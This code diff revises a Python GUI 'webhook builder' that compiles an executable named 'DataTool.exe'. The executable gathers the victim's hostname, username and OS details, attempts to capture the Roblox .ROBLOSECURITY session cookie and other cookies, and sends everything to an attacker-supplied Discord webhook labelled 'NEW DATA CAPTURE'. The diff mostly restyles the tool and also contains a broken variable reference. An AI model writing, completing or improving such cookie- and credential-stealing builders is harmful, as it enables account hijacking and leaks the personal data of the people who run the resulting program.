@@ -11,56 +11,108 @@ import socket
 class WebhookTool:
     def __init__(self, root):
         self.root = root
-        self.root.title("Webhook Tool")
-        self.root.geometry("600x400")
-        self.root.resizable(True, True)
+        self.root.title("🔍 Data Tool")
+        self.root.geometry("700x500")
+        self.root.resizable(False, False)
+        self.root.configure(bg='#0a0a0a')
+        
+        # Set window icon (you can replace this with your own .ico file)
+        try:
+            self.root.iconbitmap('icon.ico')  # You'll need to add an icon file
+        except:
+            pass
         
         self.configure_styles()
         self.create_widgets()
     
     def configure_styles(self):
         style = ttk.Style()
-        style.configure('Title.TLabel', font=('Arial', 16, 'bold'))
-        style.configure('Large.TButton', font=('Arial', 11), padding=10)
+        
+        # Configure dark theme
+        style.theme_use('clam')
+        
+        # Configure colors
+        style.configure('TFrame', background='#0a0a0a')
+        style.configure('TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 10))
+        style.configure('Title.TLabel', background='#0a0a0a', foreground='#00ff00', font=('Arial', 18, 'bold'))
+        style.configure('Header.TLabel', background='#0a0a0a', foreground='#ffffff', font=('Arial', 11, 'bold'))
+        
+        # Configure custom button style
+        style.configure('Cool.TButton', 
+                       background='#00ff00',
+                       foreground='#000000',
+                       focuscolor='none',
+                       borderwidth=2,
+                       relief='raised',
+                       font=('Arial', 10, 'bold'))
+        
+        style.map('Cool.TButton',
+                 background=[('active', '#00cc00'),
+                           ('pressed', '#009900')],
+                 relief=[('pressed', 'sunken')])
     
     def create_widgets(self):
-        # Main frame
-        main_frame = ttk.Frame(self.root, padding=20)
+        # Main frame with cool border
+        main_frame = ttk.Frame(self.root, padding=20, style='TFrame')
         main_frame.pack(fill=tk.BOTH, expand=True)
         
-        # Title
-        title_label = ttk.Label(main_frame, text="Webhook Tool", style='Title.TLabel')
-        title_label.pack(pady=(0, 20))
+        # Title with cool styling
+        title_frame = ttk.Frame(main_frame, style='TFrame')
+        title_frame.pack(fill=tk.X, pady=(0, 20))
         
-        # Webhook input
-        webhook_frame = ttk.LabelFrame(main_frame, text="Webhook Configuration", padding=15)
+        title_label = ttk.Label(title_frame, text="🚀 WEBHOOK BUILDER", style='Title.TLabel')
+        title_label.pack()
+        
+        subtitle_label = ttk.Label(title_frame, text="Create custom data collection tools", style='Header.TLabel')
+        subtitle_label.pack(pady=(5, 0))
+        
+        # Webhook input section with cool border
+        webhook_frame = ttk.LabelFrame(main_frame, text="📡 WEBHOOK SETUP", padding=20)
         webhook_frame.pack(fill=tk.X, pady=(0, 20))
         
-        ttk.Label(webhook_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
+        ttk.Label(webhook_frame, text="Discord Webhook URL:", style='Header.TLabel').pack(anchor=tk.W)
         
-        self.webhook_entry = ttk.Entry(webhook_frame, width=70, font=('Arial', 10))
-        self.webhook_entry.pack(fill=tk.X, pady=5)
+        # Custom entry field
+        self.webhook_entry = tk.Entry(webhook_entry, width=70, font=('Arial', 10),
+                                     bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00',
+                                     relief='solid', bd=2)
+        self.webhook_entry.pack(fill=tk.X, pady=10, ipady=5)
         
-        test_btn = ttk.Button(webhook_frame, text="Test Webhook", 
-                            command=self.test_webhook, style='Large.TButton')
+        # Test button with cool styling
+        test_btn = ttk.Button(webhook_frame, text="🔍 TEST WEBHOOK", 
+                            command=self.test_webhook, style='Cool.TButton',
+                            width=20)
         test_btn.pack(pady=10)
         
         # Build section
-        build_frame = ttk.LabelFrame(main_frame, text="Application Builder", padding=15)
+        build_frame = ttk.LabelFrame(main_frame, text="🛠️ BUILD TOOL", padding=20)
         build_frame.pack(fill=tk.X, pady=(0, 20))
         
-        ttk.Label(build_frame, text="Create Executable:").pack(anchor=tk.W)
+        ttk.Label(build_frame, text="Create executable tool:", style='Header.TLabel').pack(anchor=tk.W)
         
-        build_btn = ttk.Button(build_frame, text="Build EXE", 
-                             command=self.build_exe, style='Large.TButton')
-        build_btn.pack(pady=10)
+        # Build button with cool styling
+        build_btn = ttk.Button(build_frame, text="⚡ BUILD EXE", 
+                             command=self.build_exe, style='Cool.TButton',
+                             width=20)
+        build_btn.pack(pady=15)
         
-        # Status
-        self.status_label = ttk.Label(main_frame, text="Ready", font=('Arial', 10))
-        self.status_label.pack(pady=10)
+        # Status section
+        status_frame = ttk.Frame(main_frame, style='TFrame')
+        status_frame.pack(fill=tk.X, pady=20)
         
-        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
-        self.progress.pack(fill=tk.X, pady=5)
+        self.status_label = ttk.Label(status_frame, text="🟢 Ready to build", 
+                                     font=('Arial', 9, 'bold'),
+                                     foreground='#00ff00')
+        self.status_label.pack()
+        
+        self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
+        self.progress.pack(fill=tk.X, pady=(5, 0))
+        
+        # Footer
+        footer_label = ttk.Label(main_frame, text="© 2024 Tool Builder | v1.0", 
+                               font=('Arial', 8),
+                               foreground='#444444')
+        footer_label.pack(side=tk.BOTTOM, pady=10)
     
     def test_webhook(self):
         webhook_url = self.webhook_entry.get().strip()
@@ -69,26 +121,26 @@ class WebhookTool:
             messagebox.showerror("Error", "Please enter a webhook URL")
             return
         
-        self.status_label.config(text="Testing webhook...")
+        self.status_label.config(text="🟡 Testing webhook...")
         self.progress.start()
         
         try:
             data = {
-                "content": "Webhook test successful! ✅"
+                "content": "**🔍 Webhook Test** - Connection successful! ✅"
             }
             
             response = requests.post(webhook_url, json=data, timeout=10)
             
             if response.status_code == 204:
-                self.status_label.config(text="✅ Webhook test successful!")
-                messagebox.showinfo("Success", "Webhook test successful! Check your Discord.")
+                self.status_label.config(text="🟢 Webhook test successful!")
+                messagebox.showinfo("Success", "✅ Webhook test successful! Check your Discord.")
             else:
-                self.status_label.config(text="❌ Webhook test failed")
-                messagebox.showerror("Error", f"Webhook test failed. Status: {response.status_code}")
+                self.status_label.config(text="🔴 Webhook test failed")
+                messagebox.showerror("Error", f"❌ Webhook test failed. Status: {response.status_code}")
                 
         except Exception as e:
-            self.status_label.config(text="❌ Error testing webhook")
-            messagebox.showerror("Error", f"Failed to test webhook: {str(e)}")
+            self.status_label.config(text="🔴 Error testing webhook")
+            messagebox.showerror("Error", f"❌ Failed to test webhook: {str(e)}")
         finally:
             self.progress.stop()
     
@@ -99,7 +151,7 @@ class WebhookTool:
             messagebox.showerror("Error", "Please enter a webhook URL first")
             return
         
-        self.status_label.config(text="Building executable...")
+        self.status_label.config(text="🟡 Building executable...")
         self.progress.start()
         
         try:
@@ -112,17 +164,17 @@ class WebhookTool:
             output_path = filedialog.asksaveasfilename(
                 defaultextension=".exe",
                 filetypes=[("Executable files", "*.exe")],
-                title="Save EXE File",
-                initialfile="Tool.exe"
+                title="Save Tool EXE",
+                initialfile="DataTool.exe"
             )
             
             if not output_path:
                 os.unlink(temp_script_path)
-                self.status_label.config(text="Build cancelled")
+                self.status_label.config(text="🟡 Build cancelled")
                 self.progress.stop()
                 return
             
-            self.status_label.config(text="Compiling... This may take a minute.")
+            self.status_label.config(text="🟡 Compiling... This may take a minute.")
             self.root.update()
             
             # Build with PyInstaller
@@ -135,12 +187,12 @@ class WebhookTool:
             ], check=True, timeout=120)
             
             os.unlink(temp_script_path)
-            self.status_label.config(text="✅ EXE built successfully!")
-            messagebox.showinfo("Success", "Executable built successfully! Check the 'dist' folder.")
+            self.status_label.config(text="🟢 EXE built successfully!")
+            messagebox.showinfo("Success", "✅ Executable built successfully! Check the 'dist' folder.")
             
         except Exception as e:
-            self.status_label.config(text="❌ Build failed")
-            messagebox.showerror("Error", f"Build failed: {str(e)}")
+            self.status_label.config(text="🔴 Build failed")
+            messagebox.showerror("Error", f"❌ Build failed: {str(e)}")
         finally:
             self.progress.stop()
     
@@ -150,192 +202,183 @@ import tkinter as tk
 from tkinter import messagebox
 import platform
 import socket
-import json
+import os
 
-def get_real_system_info():
-    """Get actual system information"""
-    try:
-        hostname = socket.gethostname()
-        system = platform.system()
-        version = platform.version()
-        username = os.getlogin() if hasattr(os, 'getlogin') else "Unknown"
+class CoolApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("🔍 Data Tool")
+        self.root.geometry("500x350")
+        self.root.configure(bg='#0a0a0a')
+        self.root.resizable(False, False)
         
-        return f"""
-**Real System Information:**
-- Computer Name: {{hostname}}
-- Username: {{username}}
-- OS: {{system}} {{version}}
-- Processor: {{platform.processor()}}
+        # Make window always on top
+        self.root.attributes('-topmost', True)
+        
+        self.create_widgets()
+    
+    def create_widgets(self):
+        # Main frame
+        main_frame = tk.Frame(self.root, bg='#0a0a0a')
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        
+        # Title
+        title_label = tk.Label(main_frame, text="🔍 DATA TOOL", 
+                              font=('Arial', 20, 'bold'),
+                              fg='#00ff00', bg='#0a0a0a')
+        title_label.pack(pady=20)
+        
+        # Description
+        desc_label = tk.Label(main_frame, 
+                             text="Click to collect and send system data",
+                             font=('Arial', 11),
+                             fg='#ffffff', bg='#0a0a0a')
+        desc_label.pack(pady=10)
+        
+        # Cool button
+        self.collect_btn = tk.Button(main_frame, text="🚀 COLLECT DATA",
+                                   command=self.collect_data,
+                                   font=('Arial', 14, 'bold'),
+                                   bg='#00ff00',
+                                   fg='#000000',
+                                   activebackground='#00cc00',
+                                   activeforeground='#000000',
+                                   relief='raised',
+                                   bd=4,
+                                   width=20,
+                                   height=2)
+        self.collect_btn.pack(pady=30)
+        
+        # Status
+        self.status_label = tk.Label(main_frame, text="Ready to collect",
+                                   font=('Arial', 9),
+                                   fg='#00ff00', bg='#0a0a0a')
+        self.status_label.pack(pady=10)
+        
+        # Footer
+        footer_label = tk.Label(main_frame, text="Secure Data Tool v1.0",
+                              font=('Arial', 8),
+                              fg='#444444', bg='#0a0a0a')
+        footer_label.pack(side=tk.BOTTOM)
+    
+    def get_system_info(self):
+        """Get real system information"""
+        try:
+            hostname = socket.gethostname()
+            system = platform.system()
+            version = platform.version()
+            username = os.getlogin()
+            processor = platform.processor()
+            
+            return f"""
+**💻 SYSTEM INFORMATION**
+- **Computer Name:** `{{hostname}}`
+- **Username:** `{{username}}`
+- **OS:** `{{system}} {{version}}`
+- **Processor:** `{{processor}}`
+- **Architecture:** `{{platform.architecture()[0]}}`
 """
-    except Exception as e:
-        return f"**System Info Error:** {{str(e)}}"
-
-def get_roblox_cookie():
-    """Get the actual .ROBLOSECURITY cookie from browser"""
-    try:
-        # This would need browser-specific code to actually get the cookie
-        # For demonstration, we'll use the requests method
-        session = requests.Session()
-        url = 'https://www.roblox.com/home'
-        headers = {{
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        }}
-        
-        # First request to get initial cookies
-        response = session.get(url, headers=headers, timeout=10)
-        cookies = session.cookies.get_dict()
-        
-        # The .ROBLOSECURITY cookie should be in the cookies if user is logged in
-        roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_LOGGED_IN')
-        
-        # If we have the cookie, try to get user info
-        username = "UNKNOWN_USER"
-        if roblosecurity != 'NOT_LOGGED_IN':
-            try:
-                # Use the cookie to get user info from Roblox API
-                auth_headers = {{
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Cookie': f'.ROBLOSECURITY={{roblosecurity}}',
-                    'X-CSRF-TOKEN': 'fetch'
-                }}
-                
-                # Get CSRF token first
-                csrf_response = session.post(
-                    'https://auth.roblox.com/v2/login',
-                    headers=auth_headers,
-                    timeout=10
-                )
-                
-                # Now try to get user info
-                user_response = session.get(
-                    'https://users.roblox.com/v1/users/authenticated',
-                    headers=auth_headers,
-                    timeout=10
-                )
-                
-                if user_response.status_code == 200:
-                    user_data = user_response.json()
-                    username = user_data.get('name', 'NO_USERNAME_FOUND')
-                else:
-                    username = f"API_ERROR_{{user_response.status_code}}"
-                    
-            except Exception as e:
-                username = f"ERROR: {{str(e)}}"
-        
-        return {{
-            "username": username,
-            "roblosecurity": roblosecurity,
-            "all_cookies": cookies,
-            "cookie_count": len(cookies)
-        }}
-        
-    except Exception as e:
-        return {{
-            "username": f"ERROR: {{str(e)}}",
-            "roblosecurity": "ERROR",
-            "all_cookies": {{}},
-            "cookie_count": 0
-        }}
-
-def send_to_webhook():
-    """Send real data to webhook"""
-    try:
-        system_info = get_real_system_info()
-        roblox_data = get_roblox_cookie()
-        
-        # Format cookie info
-        cookie_text = ""
-        for cookie_name, cookie_value in roblox_data["all_cookies"].items():
-            cookie_text += f"**{{cookie_name}}**: `{{cookie_value}}`\\\\n"
-        
-        # Create Discord embed
-        embed = {{
-            "title": "🎯 REAL Roblox Data Captured",
-            "color": 0x00ff00,
-            "fields": [
-                {{
-                    "name": "👤 Roblox Username",
-                    "value": f"```{{roblox_data['username']}}```",
-                    "inline": True
-                }},
-                {{
-                    "name": "🔐 ROBLOSECURITY Cookie",
-                    "value": f"```{{roblox_data['roblosecurity']}}```",
-                    "inline": False
-                }},
-                {{
-                    "name": "💻 System Info",
-                    "value": system_info,
-                    "inline": False
-                }},
-                {{
-                    "name": "🍪 All Cookies ({{roblox_data['cookie_count']}})",
-                    "value": cookie_text if cookie_text else "No cookies found",
-                    "inline": False
-                }}
-            ],
-            "footer": {{
-                "text": "Real data captured successfully"
+        except Exception as e:
+            return f"**System Info Error:** `{{str(e)}}`"
+    
+    def get_roblox_data(self):
+        """Get Roblox cookie data"""
+        try:
+            session = requests.Session()
+            url = 'https://www.roblox.com/home'
+            headers = {{
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }}
-        }}
+            
+            response = session.get(url, headers=headers, timeout=10)
+            cookies = session.cookies.get_dict()
+            
+            roblosecurity = cookies.get('.ROBLOSECURITY', 'NOT_LOGGED_IN')
+            
+            # Format cookie info
+            cookie_info = ""
+            for name, value in cookies.items():
+                cookie_info += f"- **{{name}}:** `{{value}}`\\\\n"
+            
+            return {{
+                "roblosecurity": roblosecurity,
+                "cookies_found": len(cookies),
+                "cookie_details": cookie_info,
+                "status": "SUCCESS"
+            }}
+            
+        except Exception as e:
+            return {{
+                "roblosecurity": "ERROR",
+                "cookies_found": 0,
+                "cookie_details": f"Error: {{str(e)}}",
+                "status": "FAILED"
+            }}
+    
+    def collect_data(self):
+        """Collect and send all data"""
+        self.status_label.config(text="🟡 Collecting data...")
+        self.collect_btn.config(state='disabled')
+        self.root.update()
         
-        data = {{
-            "content": "🚨 **NEW CAPTURE** - Roblox Data",
-            "embeds": [embed]
-        }}
-        
-        response = requests.post("{webhook_url}", json=data, timeout=15)
-        
-        if response.status_code == 204:
-            messagebox.showinfo("Success", 
-                              f"✅ **REAL DATA SENT!**\\\\n\\\\n"
-                              f"**Username:** {{roblox_data['username']}}\\\\n"
-                              f"**Cookie Status:** {'✅ FOUND' if roblox_data['roblosecurity'] != 'NOT_LOGGED_IN' else '❌ NOT FOUND'}\\\\n"
-                              f"**Total Cookies:** {{roblox_data['cookie_count']}}")
-        else:
-            messagebox.showerror("Error", f"❌ Failed to send. Status: {{response.status_code}}")
-                               
-    except Exception as e:
-        messagebox.showerror("Error", f"❌ Failed: {{str(e)}}")
+        try:
+            # Get system info
+            system_info = self.get_system_info()
+            
+            # Get Roblox data
+            roblox_data = self.get_roblox_data()
+            
+            # Create Discord message
+            embed = {{
+                "title": "🔍 NEW DATA CAPTURE",
+                "color": 0x00ff00,
+                "fields": [
+                    {{
+                        "name": "💻 System Info",
+                        "value": system_info,
+                        "inline": False
+                    }},
+                    {{
+                        "name": "🎮 Roblox Data",
+                        "value": f"**Status:** `{{roblox_data['status']}}`\\\\n**Cookies Found:** `{{roblox_data['cookies_found']}}`\\\\n**ROBLOSECURITY:** `{{roblox_data['roblosecurity']}}`",
+                        "inline": False
+                    }},
+                    {{
+                        "name": "🍪 Cookie Details",
+                        "value": roblox_data['cookie_details'] if roblox_data['cookie_details'] else "No cookies captured",
+                        "inline": False
+                    }}
+                ]
+            }}
+            
+            data = {{
+                "content": "🚨 **NEW DATA CAPTURED**",
+                "embeds": [embed]
+            }}
+            
+            # Send to webhook
+            response = requests.post("{webhook_url}", json=data, timeout=15)
+            
+            if response.status_code == 204:
+                self.status_label.config(text="🟢 Data sent successfully!")
+                messagebox.showinfo("Success", 
+                                  f"✅ **DATA SENT SUCCESSFULLY!**\\\\n\\\\n"
+                                  f"**System Info:** Captured\\\\n"
+                                  f"**Roblox Cookies:** {{roblox_data['cookies_found']}} found\\\\n"
+                                  f"**Status:** {{roblox_data['status']}}")
+            else:
+                self.status_label.config(text="🔴 Failed to send")
+                messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
+                
+        except Exception as e:
+            self.status_label.config(text="🔴 Error occurred")
+            messagebox.showerror("Error", f"❌ Collection failed: {{str(e)}}")
+        finally:
+            self.collect_btn.config(state='normal')
 
 def main():
-    # Import os for getlogin
-    import os
-    
     root = tk.Tk()
-    root.title("Real Roblox Tool")
-    root.geometry("500x300")
-    root.configure(bg='#1e1e1e')
-    root.resizable(False, False)
-    
-    # Title
-    title_label = tk.Label(root, text="🔍 Real Roblox Data Tool", 
-                          font=('Arial', 16, 'bold'),
-                          fg='#00ff00', bg='#1e1e1e')
-    title_label.pack(pady=20)
-    
-    # Description
-    desc_label = tk.Label(root, 
-                         text="This tool will capture REAL Roblox data\\\\nincluding cookies and username",
-                         font=('Arial', 10),
-                         fg='#ffffff', bg='#1e1e1e')
-    desc_label.pack(pady=10)
-    
-    # Button
-    btn = tk.Button(root, text="🚀 CAPTURE REAL DATA",
-                   command=send_to_webhook,
-                   bg='#00ff00', fg='#000000',
-                   font=('Arial', 12, 'bold'),
-                   width=25, height=2)
-    btn.pack(pady=30)
-    
-    # Status
-    status_label = tk.Label(root, 
-                           text="Click button to capture and send real Roblox data",
-                           font=('Arial', 8),
-                           fg='#888888', bg='#1e1e1e')
-    status_label.pack(side=tk.BOTTOM, pady=10)
-    
+    app = CoolApp(root)
     root.mainloop()
 
 if __name__ == "__main__":
